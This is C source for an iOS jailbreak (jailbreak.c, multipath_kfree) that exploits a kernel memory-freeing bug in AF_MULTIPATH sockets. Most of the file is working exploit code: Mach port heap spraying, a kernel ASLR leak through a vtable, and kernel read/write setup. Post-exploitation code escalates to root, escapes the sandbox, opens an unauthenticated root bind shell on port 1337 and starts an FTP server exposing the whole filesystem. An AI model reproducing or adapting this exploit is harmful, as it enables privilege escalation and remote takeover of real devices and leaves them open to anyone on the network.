//
//  jailbreak.c
//  multipath_kfree
//
//  Created by John Åkerblom on 6/1/18.
//  Copyright © 2018 kjljkla. All rights reserved.
//

#include "jailbreak.h"
#include "offsets.h"
#include "extra_recipe_utils.h"
#include "multipath_kfree.h"
#include "QiLin.h"
#include "pureftpd.h"

#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <spawn.h>
#include <dirent.h>
#include <CoreFoundation/CoreFoundation.h>
#include <sys/stat.h>

uint64_t kernel_base = 0;

#ifndef AF_MULTIPATH
#define AF_MULTIPATH 39
#endif

#define MP_SOCK_COUNT 0x10
#define FIRST_PORTS_COUNT 100
#define REFILL_PORTS_COUNT 100
#define TOOLAZY_PORTS_COUNT 1000
#define REFILL_USERCLIENTS_COUNT 1000
#define MAX_PEEKS 60000
char* bundle_path() {
    CFBundleRef mainBundle = CFBundleGetMainBundle();
    CFURLRef resourcesURL = CFBundleCopyResourcesDirectoryURL(mainBundle);
    int len = 4096;
    char* path = malloc(len);
    
    CFURLGetFileSystemRepresentation(resourcesURL, TRUE, (UInt8*)path, len);
    
    return path;
}

char* prepare_directory(char* dir_path) {
    DIR *dp;
    struct dirent *ep;
    
    char* in_path = NULL;
    char* bundle_root = bundle_path();
    asprintf(&in_path, "%s/iosbinpack64/%s", bundle_root, dir_path);
    
    
    dp = opendir(in_path);
    if (dp == NULL) {
        printf("unable to open payload directory: %s\n", in_path);
        return NULL;
    }
    
    while ((ep = readdir(dp))) {
        char* entry = ep->d_name;
        char* full_entry_path = NULL;
        asprintf(&full_entry_path, "%s/iosbinpack64/%s/%s", bundle_root, dir_path, entry);
        
        printf("preparing: %s\n", full_entry_path);
        
        // make that executable:
        int chmod_err = chmod(full_entry_path, 0777);
        if (chmod_err != 0){
            printf("chmod failed\n");
        }
        
        
        free(full_entry_path);
    }
    
    closedir(dp);
    free(bundle_root);
    
    return in_path;
}

// prepare all the payload binaries under the iosbinpack64 directory
// and build up the PATH
char* prepare_payload() {
    char* path = calloc(4096, 1);
    strcpy(path, "PATH=");
    char* dir;
    dir = prepare_directory("bin");
    strcat(path, dir);
    strcat(path, ":");
    free(dir);
    
    dir = prepare_directory("sbin");
    strcat(path, dir);
    strcat(path, ":");
    free(dir);
    
    dir = prepare_directory("usr/bin");
    strcat(path, dir);
    strcat(path, ":");
    free(dir);
    
    dir = prepare_directory("usr/local/bin");
    strcat(path, dir);
    strcat(path, ":");
    free(dir);
    
    dir = prepare_directory("usr/sbin");
    strcat(path, dir);
    strcat(path, ":");
    free(dir);
    
    strcat(path, "/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec");
    
    return path;
}

void do_bind_shell(char* env, int port) {
    castrateAmfid();
    char* bundle_root = bundle_path();
    
    char* shell_path = NULL;
    asprintf(&shell_path, "%s/iosbinpack64/bin/bash", bundle_root);
    
    char* argv[] = {shell_path, NULL};
    char* envp[] = {env, NULL};
    
    struct sockaddr_in sa;
    sa.sin_len = 0;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = INADDR_ANY;
    
    int sock = socket(PF_INET, SOCK_STREAM, 0);
    bind(sock, (struct sockaddr*)&sa, sizeof(sa));
    listen(sock, 1);
    
    printf("shell listening on port %d\n", port);
    
    for(;;) {
        int conn = accept(sock, 0, 0);
        
        posix_spawn_file_actions_t actions;
        
        posix_spawn_file_actions_init(&actions);
        posix_spawn_file_actions_adddup2(&actions, conn, 0);
        posix_spawn_file_actions_adddup2(&actions, conn, 1);
        posix_spawn_file_actions_adddup2(&actions, conn, 2);
        
        
        pid_t spawned_pid = 0;
        int spawn_err = spawnAndPlatformize(shell_path, argv[0], NULL, NULL, NULL, NULL);
        if (spawn_err != 0){
            perror("shell spawn error");
        } else {
            printf("shell posix_spawn success!\n");
        }
        
        posix_spawn_file_actions_destroy(&actions);
        
        printf("our pid: %d\n", getpid());
        printf("spawned_pid: %d\n", spawned_pid);
        
        int wl = 0;
        while (waitpid(spawned_pid, &wl, 0) == -1 && errno == EINTR);
    }
    
    free(shell_path);
}


typedef struct alloc_asid_arg {
    int max_asid;
} alloc_asid_arg;

void* alloc_asid(void* arg) {
    for(int i = 0; i < ((alloc_asid_arg*)arg)->max_asid; i++) {
        syscall(SYS_execve, NULL, NULL, NULL);
    }
    return NULL;
}

void panic_now() {
    
    int max_asid = 65536;
    int max_attempts = 1000;
    alloc_asid_arg arg = { max_asid };
    for(int attempts = 0; attempts < max_attempts; attempts++) {
        pthread_t thread;
        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_create(&thread, &attr, &alloc_asid, &arg);
    }
}

static void _init_port_with_empty_msg(mach_port_t port)
{
    uint8_t buf[256];
    memset(buf, 0x00, sizeof(buf));
    prepare_prealloc_port(port);
    send_prealloc_msg(port, (uint64_t *)buf, 30);
}

static int _is_port_corrupt(mach_port_t port)
{
    
    kern_return_t err;
    mach_port_seqno_t msg_seqno = 0;
    mach_msg_size_t msg_size = 0;
    mach_msg_id_t msg_id = 0;
    mach_msg_trailer_t msg_trailer; // NULL trailer
    mach_msg_type_number_t msg_trailer_size =  sizeof(msg_trailer);
    err = mach_port_peek(mach_task_self(),
                             port,
                             MACH_RCV_TRAILER_NULL,
                             &msg_seqno,
                             &msg_size,
                             &msg_id,
                             (mach_msg_trailer_info_t)&msg_trailer,
                             &msg_trailer_size);
    if (msg_id && (msg_id != 0x962)) {
        printf("Port %#x is corrupt!\n", port);
        return 1;
    }
    
    return 0;
}


static int __readKernelMemory(uint64_t Address, uint64_t Len, void **To)
{
    void *mem = malloc(Len);
    kread(Address, mem, (int)Len);
    *To = mem;
    
    return (int)Len;
}

static int __writeKernelMemory(uint64_t Address, uint64_t Len, void *From)
{
    kwrite(Address, From, (int)Len);
    
    return (int)Len;
}

// This will not enable all QiLin features - but enough for us
void _init_tfp0less_qilin(uint64_t kaslr_shift)
{
    uint64_t kernproc = offsets.kernproc + kaslr_shift;
    uint64_t *m = (uint64_t *)mmap((void *)0x110000000, 0x4000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    
    *m = (uint64_t)__readKernelMemory;
    *(m + 1) = (uint64_t)__writeKernelMemory;
    *(m + 2) = kernproc;
}

void post_exploitation(uint64_t kernel_base, uint64_t kaslr_shift)
{
    printf("Stage 2: Escalating to root and escaping sandbox...\n");
    
    printf("Initializing tfp0less...\n");
    _init_tfp0less_qilin(kaslr_shift);
    
    printf("Initializing Jonathan Levin's jailbreak toolkit...\n");
    initQiLin(0x1337, kernel_base);
    
    printf("Our context before escalation: uid: %d gid: %d user: %s euid: %d egid: %d\n", getuid(), getgid(), getlogin(), geteuid(), getegid());
    
    printf("Escalating our process to the root context...\n");
    if(!rootifyMe()) {
        printf("Failed to escalate to the root user by using Levine's logic.\n");
    }
    
    printf("Our context after escalation: uid: %d gid: %d user: %s euid: %d egid: %d\n", getuid(), getgid(), getlogin(), geteuid(), getegid());
    
    printf("Escaping the sandbox...\n");
    if(!ShaiHuludMe(0)) {
        printf("Failed to escape the sandbox using Levine's logic.\n");
    }
    
    printf("If all went well, sandbox escaped and root achieved now, you might want to manually verify that.\n");
    
    printf("Stage 3: Remounting the rootfilesystem.\n");
    printf("Using SparkZheng's bug in APFS to path and remount the rootfilesystem as writeable.\n");
    printf("This is currently not implemented yet, continueing...\n");
    
    printf("Stage 4: Shell access and FTP server.\n");
    
    printf("Preparing the shell environment...\n");
    char* env_path = prepare_payload();
    
    printf("Starting our shell on port 1337...\n");
    printf("The environment or the shell is: %s\n", env_path);
    //int forked = fork();
    char* args[] = {0};
    do_bind_shell(env_path, 1337);
    
    printf("Starting our FTP server (MTFTP/PureFTPd) on port 21...\n");
    pureftpd_start(0,args, "/", 21);

    
    free(env_path);
    
}

void jb_go(void)
{
    init_offsets();
    printf("Initializing multipath_kfree bug...\n");
    printf("Most important offsets are: \n\n");
    printf("- AGXCommandQueue vtable: %#llx\n", offsets.AGXCommandQueue_vtable);
    printf("- copyin: %#llx\n", offsets.copyin);
    printf("- copyout: %#llx\n", offsets.copyout);
    printf("- OSSerializer_Serialize: %#llx\n", offsets.osserializer_serialize);
    printf("- OSMetaClass: %#llx\n", offsets.metaclass);
    printf("- kernproc: %#llx\n", offsets.kernproc);
    printf(" \n");
    printf("If one of the offsets above is zero than you will probably need a disassembler or Mach-O parser to find them.\n");
    
    io_connect_t refill_userclients[REFILL_USERCLIENTS_COUNT];
    mach_port_t first_ports[FIRST_PORTS_COUNT];
    mach_port_t refill_ports[REFILL_PORTS_COUNT];
    mach_port_t toolazy_ports[TOOLAZY_PORTS_COUNT];
    mach_port_t corrupt_port = 0;
    uint64_t contained_port_addr = 0;
    uint8_t *recv_buf = NULL;
    uint8_t send_buf[1024];
    
    int mp_socks[MP_SOCK_COUNT];
    int prealloc_size = 0x660; // kalloc.4096
    int found = 0;
    int peeks = 0;
    
    for (int i = 0; i < 10000; ++i){
        prealloc_port(prealloc_size);
    }
    
    
    for (int i = 0; i < 0x20; ++i) {
        first_ports[i] = prealloc_port(prealloc_size);
        
    }
    
    mp_socks[0] = socket(AF_MULTIPATH, SOCK_STREAM, 0);

    for (int i = 0x20; i < FIRST_PORTS_COUNT; ++i) {
        first_ports[i] = prealloc_port(prealloc_size);
    }
    
    for (int i = 1; i < MP_SOCK_COUNT; ++i) {
        mp_socks[i] = socket(AF_MULTIPATH, SOCK_STREAM, 0);
    }
    
    for (int i = 0; i < FIRST_PORTS_COUNT; ++i) {
        _init_port_with_empty_msg(first_ports[i]);
    }
    
    printf("Freeing first and second slightly aligned address in our socket struct in kernel zone 4096 ...\n");
    multipath_kfree_nearby_self(mp_socks[0], 0x0000 + 0x7a0);
    multipath_kfree_nearby_self(mp_socks[3], 0xe000 + 0x7a0);
    
    printf("Finding corrupt port in that zone so we can leak the kernel ASLR shift later...\n");
    for (peeks = 0; peeks < MAX_PEEKS; ++peeks) {
        for (int i = 0 ; i < FIRST_PORTS_COUNT; ++i) {
            if (_is_port_corrupt(first_ports[i])) {
                corrupt_port = first_ports[i];
                printf("Corrupt port: %08X %d\n", corrupt_port, i);
                found = 1;
                break;
            }
        }
        
        if (found)
            break;
    }
    
    if (peeks >= MAX_PEEKS) {
        printf("Didn't find corrupt port\n");
        sleep(1);
        //panic_now(); //Uncomment if you want panics
        exit(0);
    }
    
    printf("Filling ports to serve as a zone spray for finding the kASLR slide and getting r/w...\n");
    for (int i = 0; i < REFILL_PORTS_COUNT; ++i) {
        refill_ports[i] = prealloc_port(prealloc_size);
    }
    
    for (int i = 0; i < REFILL_PORTS_COUNT; ++i) {
        _init_port_with_empty_msg(refill_ports[i]);
    }

    recv_buf = (uint8_t *)receive_prealloc_msg(corrupt_port);
    
    contained_port_addr = *(uint64_t *)(recv_buf + 0x1C);
    printf("Refill port is at %p\n", (void *)contained_port_addr);
    
    memset(send_buf, 0, sizeof(send_buf));
    send_prealloc_msg(corrupt_port, (uint64_t *)send_buf, 30);
    
    multipath_kfree(contained_port_addr);
    
    for (;;) {
        if (_is_port_corrupt(corrupt_port)) {
            break;
        }
    }
    printf("Leaking kASLR...\n");
    for (int i = 0; i < REFILL_USERCLIENTS_COUNT; ++i) {
        refill_userclients[i] = alloc_userclient();
    }
    
    recv_buf = (uint8_t *)receive_prealloc_msg(corrupt_port);
    
    uint64_t vtable = *(uint64_t *)(recv_buf + 0x14);
    uint64_t kaslr_shift = vtable - offsets.AGXCommandQueue_vtable ;
    printf("AGXCommandQueue vtable pointer: %p\n", (void *)vtable);
    printf("kernel aslr shift: %p\n", (void*)kaslr_shift);
    
    printf("Destroying the corrupted port as we now have the kASLR slide...\n");
    mach_port_destroy(mach_task_self(), corrupt_port);
    
    for (int i = 0; i < TOOLAZY_PORTS_COUNT; ++i) {
        toolazy_ports[i] = prealloc_port(prealloc_size-0x28); // Not even really aligned because lazy
    }
    
    printf("Getting kernel r/w access...\n");
    kx_setup(refill_userclients, toolazy_ports, kaslr_shift, contained_port_addr);
    
    kernel_base = 0xfffffff007004000 + kaslr_shift;
    uint32_t val = kread32(kernel_base);
    
    printf("kernelbase DWORD (32-bits value): %08X, this should be the mach-o magic.\n", val);
    
    post_exploitation(kernel_base, kaslr_shift);
    
    printf("Done\n");
    for (;;)
        sleep(1);
}
